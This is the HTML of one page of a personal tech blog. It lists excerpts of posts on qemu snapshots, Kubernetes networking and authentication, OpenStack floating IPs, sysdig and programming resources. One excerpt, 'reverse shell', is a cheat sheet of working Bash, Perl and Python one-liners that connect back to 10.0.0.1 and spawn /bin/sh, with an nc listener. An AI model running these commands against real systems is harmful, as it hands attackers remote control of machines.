<!doctype html><html lang=zh-cn><head><link href=https://gmpg.org/xfn/11 rel=profile><link rel=canonical href=https://feisky.xyz/><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta name=generator content="Hugo 0.148.1"><title>Feisky</title><meta name=twitter:card content="summary"><meta name=twitter:title content="Feisky"><meta name=twitter:site content="@feisky"><meta property="og:url" content="https://feisky.xyz/"><meta property="og:site_name" content="Feisky"><meta property="og:title" content="Feisky"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="website"><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.4.0/styles/monokai.min.css><link rel=stylesheet href=/scss/triple-hyde.9e606bf339ab725ad1f7f06c9fe271099ac7709da56e4d541670f116255e9cd6.css integrity="sha256-nmBr8zmrclrR9/Bsn+JxCZrHcJ2lbk1UFnDxFiVenNY="><link rel=stylesheet href=/scss/print.2744dcbf8a0b2e74f8a50e4b34e5f441be7cf93cc7de27029121c6a09f9e77bc.css integrity="sha256-J0Tcv4oLLnT4pQ5LNOX0Qb58+TzH3icCkSHGoJ+ed7w=" media=print><link rel=stylesheet href=/scss/tocbot.5ef07cebc3c477b54270456f149ee02922479bb7555fd344b2c69f953b0e7e5e.css integrity="sha256-XvB868PEd7VCcEVvFJ7gKSJHm7dVX9NEssaflTsOfl4="><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js></script><script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]--><link rel=apple-touch-icon-precomposed sizes=144x144 href=/apple-touch-icon-144-precomposed.png><link rel="shortcut icon" href=/favicon.png><link rel=alternate type=application/rss+xml href=https://feisky.xyz/index.xml title=Feisky></head><body class=theme-base-0d><div class=sidebar><div class=container><div class=sidebar-about><span class=site__title><a href=https://feisky.xyz/>Feisky</a></span><div class=author-image><img src="https://www.gravatar.com/avatar/f86d2faa0f91793a2163d226d82a7620?s=240&d=mp" class="img--circle img--headshot element--center" alt=gravatar></div><p class=site__description></p></div><div class=collapsible-menu><input type=checkbox id=menuToggle>
<label for=menuToggle>Feisky</label><div class=menu-content><div><ul class=sidebar-nav><li><a href=https://time.geekbang.org/column/intro/100020901><span>Linux性能优化实战</span></a></li><li><a href=https://time.geekbang.org/column/intro/100104501><span>EBPF核心技术与实战</span></a></li><li><a href=https://kubernetes.feisky.xyz><span>Kubernetes指南</span></a></li><li><a href=https://sdn.feisky.xyz><span>SDN网络指南</span></a></li><li><a href=/assets/mp.png><span>微信公众号</span></a></li><li><a href=/about/><span>关于我</span></a></li></ul></div><section class=social><a href=https://twitter.com/feisky rel=me><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645.0 138.72-105.583 298.558-298.558 298.558-59.452.0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055.0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421.0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391.0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04.0-57.828 46.782-104.934 104.934-104.934 30.213.0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
</span></a><a href=https://github.com/feiskyer rel=me><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></a></section></div></div><div class=copyright>&copy; 2025 feiskyer
<a href=https://creativecommons.org/licenses/by-sa/4.0>CC BY-SA 4.0</a></div><div class=builtwith>Built with <a href=https://gohugo.io>Hugo</a> ❤️ <a href=https://github.com/derme302/triple-hyde>triple-hyde</a>.</div></div></div><div class="content container"><div class=post-list><div class=post-list__item><span class=item__title--big><a href=/posts/2015-02-10-perform-consistent-snapshots-with-qemu-guest-agent/>Perform Consistent Snapshots with qemu guest agent</a>
</span><span class=item__date>Jan 01, 0001
</span><span><p>A while back, I <a href=http://www.sebastien-han.fr/blog/2012/12/10/openstack-perform-consistent-snapshots/>wrote an article</a> about taking consistent snapshots of your virtual machines in your OpenStack environment.
However this method was really intrusive since it required to be inside the virtual machine and to manually summon a filesystem freeze.
In this article, I will use a different approach to achieve the same goal without the need to be inside the virtual machine.</p><p>The only requirement is to have a virtual machine running the qemu-guest-agent.</p></span>... <a class=read-more-symbol href=/posts/2015-02-10-perform-consistent-snapshots-with-qemu-guest-agent/>➦</a></div><div class=post-list__item><span class=item__title--big><a href=/posts/2015-01-27-pluribus-networks/>Pluribus Networks</a>
</span><span class=item__date>Jan 01, 0001
</span><span><p>已经融资9500万美元的<a href=http://www.pluribusnetworks.com>Pluribus</a>公司，做得Server Switch产品，其CEO说，既能克服Vmware产品的scalability, invisibility, performance问题，又能克服Cisco ACI的系统封闭性。说白了就是把网络做在服务器里面，但是网络处理发生在交换芯片而不是CPU里面，跟Facebook Wedge一样 @盛科张卫峰</p></span>... <a class=read-more-symbol href=/posts/2015-01-27-pluribus-networks/>➦</a></div><div class=post-list__item><span class=item__title--big><a href=/posts/2015-02-11-ios-blog-resources/>Programming Resources</a>
</span><span class=item__date>Jan 01, 0001
</span><span><h2 id=索引>索引</h2><p><a href=#ANDROID>ANDROID</a></p><p><a href=#ANGULAR>ANGULAR</a></p><p><a href=#BOOTSTRAP>BOOTSTRAP</a></p><p><a href=#C#>C#</a></p><p><a href=#C/C++>C/C++</a></p><p><a href=#CASSANDRA>CASSANDRA</a></p><p><a href=#CHROME>CHROME</a></p><p><a href=#CLOJURE>CLOJURE</a></p><p><a href=#COUCHDB>COUCHDB</a></p><p><a href=#D>D</a></p><p><a href=#DAPPER>DAPPER</a></p><p><a href=#DEVOPS>DEVOPS</a></p><p><a href=#DOCKER>DOCKER</a></p><p><a href=#ERLANG>ERLANG</a></p><p><a href=#FIREFOX>FIREFOX</a></p><p><a href=#GIT>GIT</a></p><p><a href=#GO>GO</a></p><p><a href=#HADOOP>HADOOP</a></p><p><a href=#HASKELL>HASKELL</a></p><p><a href=#HTML5>HTML5</a></p><p><a href=#IOS>IOS</a></p><p><a href=#JAVA>JAVA</a></p><p><a href=#JAVASCRIPT>JAVASCRIPT</a></p><p><a href=#LINUX>LINUX</a></p><p><a href=#LISP>LISP</a></p><p><a href=#LUA>LUA</a></p><p><a href=#MARKDOWN>MARKDOWN</a></p><p><a href=#MATH>MATH</a></p><p><a href=#MEMCACHED>MEMCACHED</a></p><p><a href=#MONGODB>MONGODB</a></p><p><a href=#MYSQL>MYSQL</a></p><p><a href=#NGINX>NGINX</a></p><p><a href=#NODE.JS>NODE.JS</a></p><p><a href=#OPENGL>OPENGL</a></p><p><a href=#OPENSTACK>OPENSTACK</a></p><p><a href=#PERL>PERL</a></p><p><a href=#PHP>PHP</a></p><p><a href=#POSTGRESQL>POSTGRESQL</a></p><p><a href=#PUPPET>PUPPET</a></p><p><a href=#PYTHON>PYTHON</a></p><p><a href=#R>R</a></p><p>[RASPBERRY PI](#RASPBERRY PI)</p><p><a href=#REDIS>REDIS</a></p><p><a href=#REGEX>REGEX</a></p><p><a href=#RUBY>RUBY</a></p><p><a href=#RUST>RUST</a></p><p><a href=#SCALA>SCALA</a></p><p><a href=#SHELL>SHELL</a></p><p><a href=#SPARK>SPARK</a></p><p><a href=#STORM>STORM</a></p><p><a href=#SWIFT>SWIFT</a></p><p><a href=#VARNISH>VARNISH</a></p><p><a href=#VIM>VIM</a></p><p><a href=#WEB%E5%89%8D%E7%AB%AF>WEB前端</a></p><p><a href=#WEB%E5%AE%89%E5%85%A8>WEB安全</a></p><p><a href=#WOLFRAM>WOLFRAM</a></p><p><a href=#%E5%BC%80%E6%BA%90%E7%B3%BB%E7%BB%9F>开源系统</a></p><p><a href=#%E6%8A%80%E6%9C%AF%E7%A7%91%E6%99%AE>技术科普</a></p><p><a href=#%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0>数据挖掘/机器学习</a></p><p><a href=#%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%AE%97%E6%B3%95>数据结构/算法</a></p><p><a href=#%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1>程序设计</a></p><p><a href=#%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%A4%96>编程之外</a></p><p><a href=#%E7%BC%96%E7%A8%8B%E5%B7%A5%E5%85%B7>编程工具</a></p><p><a href=#%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90>编程资源</a></p><p><a href=#%E7%BD%91%E7%AB%99%E6%9E%B6%E6%9E%84>网站架构</a></p><h2 id=android>ANDROID</h2><p><a href="http://weekly.manong.io/bounce?url=https%3A%2F%2Ftutsplus.com%2Fcourse%2Fandroid-for-the-busy-developer%2F&amp;aid=67&amp;nid=5">面向忙碌开发者的 Android 视频教程（Tuts+）</a></p></span>... <a class=read-more-symbol href=/posts/2015-02-11-ios-blog-resources/>➦</a></div><div class=post-list__item><span class=item__title--big><a href=/posts/2015-03-05-python-not-defined-problem/>Python __file__ not defined problem</a>
</span><span class=item__date>Jan 01, 0001
</span><span><p>__file__仅在文件中运行的时候才正常，而在交互式命令行中则需要使用变通的方法：</p><pre tabindex=0><code>import os
import inspect
import sys
if not hasattr(sys.modules[__name__], &#39;__file__&#39;):
    __file__ = inspect.getfile(inspect.currentframe())

print os.path.dirname(os.path.abspath(__file__))
</code></pre></span></div><div class=post-list__item><span class=item__title--big><a href=/posts/2015-03-06-redhat-atomic-host/>Redhat Atomic Host</a>
</span><span class=item__date>Jan 01, 0001
</span><span><h3 id=introduction>Introduction</h3><p>Red Hat has announced first public beta of <a href=http://www.projectatomic.io/>Red Hat Enterprise Linux 7 Atomic Host</a>. The beta is available from Red Hat and on Amazon Web Services and Google Compute Platform.</p><p>What can you expect from the Red Hat Enterprise Linux 7 Atomic Host Beta?</p><h4 id=specifically-designed-to-run-containers>Specifically Designed to Run Containers</h4><p>Red Hat Enterprise Linux 7 Atomic Host Beta provides a streamlined host platform that is optimized to run application containers. The software components included in Red Hat Enterprise Linux 7 Atomic Host Beta, as well as the default system tunings, have been designed to enhance the performance, scalability and security of containers, giving you the optimal platform on which to deploy and run application containers.</p></span>... <a class=read-more-symbol href=/posts/2015-03-06-redhat-atomic-host/>➦</a></div><div class=post-list__item><span class=item__title--big><a href=/posts/2015-01-28-reverse-shell/>reverse shell</a>
</span><span class=item__date>Jan 01, 0001
</span><span><h3 id=listen-for-8080-first>Listen for 8080 first</h3><pre>
nc -l -p 8080 -vvv
</pre><h3 id=bash>Bash</h3><p>Some versions of <a href=http://www.gnucitizen.org/blog/reverse-shell-with-bash/>bash can send you a reverse shell</a> (this was tested on Ubuntu 10.10):</p><pre>
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
</pre><h3 id=perl>PERL</h3><p>Here’s a shorter, feature-free version of the <a href=http://pentestmonkey.net/tools/web-shells/perl-reverse-shell>perl-reverse-shell</a>:</p><pre>
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
</pre><p>There’s also an <a href=http://www.plenz.com/reverseshell>alternative PERL revere shell here</a>.</p><h3 id=python>Python</h3><p>This was tested under Linux / Python 2.7:</p><pre>
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
</pre><h3 id=php>PHP</h3><p>This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…</p></span>... <a class=read-more-symbol href=/posts/2015-01-28-reverse-shell/>➦</a></div><div class=post-list__item><span class=item__title--big><a href=/posts/2015-03-02-setting-up-gre-for-kubernetes/>Setting up GRE for Kubernetes</a>
</span><span class=item__date>Jan 01, 0001
</span><span><p>首先修改Docker的默认网桥：</p><pre tabindex=0><code>#停止Docker Daemon进程
systemctl stop docker

#设置默认网桥docker0为down，并删除
ip link set dev docker0 down
brctl delbr docker0

#新建Linux网桥localbr0
brctl addbr localbr0

#在每台主机上更改10.10.x.0/24，注意各台主机之间不要重复
ip addr add 10.10.2.1/24 dev localbr0
ip link set dev localbr0 up

echo &#39;OPTIONS=&#34;--bridge localbr0 --iptables=false&#34;&#39;&gt;&gt;/etc/sysconfig/docker
systemctl start Docker
</code></pre><p>为上述网桥添加GRE连接</p></span>... <a class=read-more-symbol href=/posts/2015-03-02-setting-up-gre-for-kubernetes/>➦</a></div><div class=post-list__item><span class=item__title--big><a href=/posts/2015-09-23-something-about-kubernetes-authentication/>Something about kubernetes authentication</a>
</span><span class=item__date>Jan 01, 0001
</span><span><p>You can enable kubernetes authentication by through <a href=https://github.com/kubernetes/kubernetes/blob/master/docs/admin/authentication.md>this documentation</a>. Then you happily access kube-apiserve by curl:</p><pre tabindex=0><code># curl -k -N -X GET -H &#34;Authorization: Basic XXXXXXXXXX&#34; http://localhost:8080/api/v1/namespaces/default/pods
{
  &#34;kind&#34;: &#34;PodList&#34;,
  &#34;apiVersion&#34;: &#34;v1&#34;,
  &#34;metadata&#34;: {
    &#34;selfLink&#34;: &#34;/api/v1/namespaces/default/pods&#34;,
    &#34;resourceVersion&#34;: &#34;74034&#34;
  },
  &#34;items&#34;: []
}
</code></pre><p>Nothing blocks this request! What is wrong? Wait a moment and checkout kubernetes documentation, I find this:</p><blockquote><p>The Kubernetes API is served by the Kubernetes apiserver process. Typically,
there is one of these running on a single kubernetes-master node.</p></span>... <a class=read-more-symbol href=/posts/2015-09-23-something-about-kubernetes-authentication/>➦</a></div><div class=post-list__item><span class=item__title--big><a href=/posts/2015-06-25-stateless-floating-ips/>Stateless Floating IPs</a>
</span><span class=item__date>Jan 01, 0001
</span><span><p>Neutron里面的Floating IPs目前是基于iptables NAT来实现的，它使用ip_conntrack来跟踪所有连接（五元组），而ip_conntrack会大大降低NAT的性能，并且也有一些安全问题（比如<a href=https://review.openstack.org/#/c/124375/>conntrack未释放问题</a>）。从Floating IPs的作用来看，它只需要完成源目的IP地址的转换即可，完全可以不需要conntrack，因而就有了一个<a href=https://blueprints.launchpad.net/neutron/+spec/stateless-floatingips>Stateless Floating IPs</a>的BP,</p></span>... <a class=read-more-symbol href=/posts/2015-06-25-stateless-floating-ips/>➦</a></div><div class=post-list__item><span class=item__title--big><a href=/posts/2015-06-24-sysdig/>sysdig</a>
</span><span class=item__date>Jan 01, 0001
</span><span><p>Sysdig captures system calls and other system level events using a linux kernel facility called tracepoints, providing a rich set of real-time, system-level information.</p><p>Sysdig &ldquo;packetizes&rdquo; this information, so that you can do things like save it into trace files and easily filter it, a bit like you would do with tcpdump. This makes it very flexible to explore what processes are doing.</p><p>Sysdig instruments your physical and virtual machines at the OS level by installing into the Linux kernel and capturing system calls and other OS events. Then, using sysdig&rsquo;s command line interface, you can filter and decode these events in order to extract useful information. Sysdig can be used to inspect systems live in real-time, or to generate trace files that can be analyzed at a later stage.</p></span>... <a class=read-more-symbol href=/posts/2015-06-24-sysdig/>➦</a></div></div><ul class=pagination><li class=page-item><a href=/ class=page-link aria-label=First><span aria-hidden=true>&#171;&#171;</span></a></li><li class=page-item><a href=/page/13/ class=page-link aria-label=Previous><span aria-hidden=true>&#171;</span></a></li><li class=page-item><a class=page-link href=/>1</a></li><li class=page-item><a class=page-link href=/page/2/>2</a></li><li class=page-item><a class=page-link href=/page/3/>3</a></li><li class="page-item disabled"><span aria-hidden=true>&nbsp;&mldr;&nbsp;</span></li><li class=page-item><a class=page-link href=/page/13/>13</a></li><li class="page-item active"><a class=page-link href=/page/14/>14</a></li><li class=page-item><a class=page-link href=/page/15/>15</a></li><li class=page-item><a href=/page/15/ class=page-link aria-label=Next><span aria-hidden=true>&#187;</span></a></li><li class=page-item><a href=/page/15/ class=page-link aria-label=Last><span aria-hidden=true>&#187;&#187;</span></a></li></ul></div><script async src="https://www.googletagmanager.com/gtag/js?id=G-1GD5S2NKS3"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-1GD5S2NKS3")}</script></body></html>